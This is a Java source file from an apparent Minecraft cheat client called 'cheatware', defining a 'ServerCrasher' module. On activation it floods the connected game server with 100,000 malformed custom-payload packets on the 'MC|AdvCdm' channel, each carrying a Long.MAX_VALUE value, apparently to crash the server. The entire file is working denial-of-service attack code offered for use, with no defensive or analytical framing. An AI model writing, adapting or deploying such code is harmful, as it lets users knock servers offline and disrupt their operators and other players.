package cheatware.module.player;

import org.lwjgl.input.Keyboard;

import cheatware.module.Category;
import cheatware.module.Module;
import io.netty.buffer.Unpooled;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;

public class ServerCrasher extends Module {
	
	public ServerCrasher() {
		super("ServerCrasher", Keyboard.KEY_NONE, Category.PLAYER);
	}
	
	public void onEnable() {
		super.onEnable();
		final PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
        packetbuffer.writeLong(Long.MAX_VALUE);
        for (int i = 0; i < 100000; ++i) {
        	mc.getNetHandler().addToSendQueue(new C17PacketCustomPayload("MC|AdvCdm", packetbuffer));
        }
	}
}
